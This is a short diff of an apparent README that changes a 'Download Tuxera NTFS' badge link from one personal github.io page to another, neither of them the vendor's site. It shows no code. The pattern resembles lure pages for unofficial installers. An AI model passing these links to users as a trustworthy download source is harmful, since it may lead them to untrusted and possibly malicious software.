@@ -6,7 +6,7 @@
 
 ## 📥 Download Tuxera NTFS for macOS
 
-[![⬇️ Download Tuxera NTFS](https://img.shields.io/badge/Download-Tuxera%20NTFS%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Tuxera)
+[![⬇️ Download Tuxera NTFS](https://img.shields.io/badge/Download-Tuxera%20NTFS%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Tuxera)
 
 ---
 
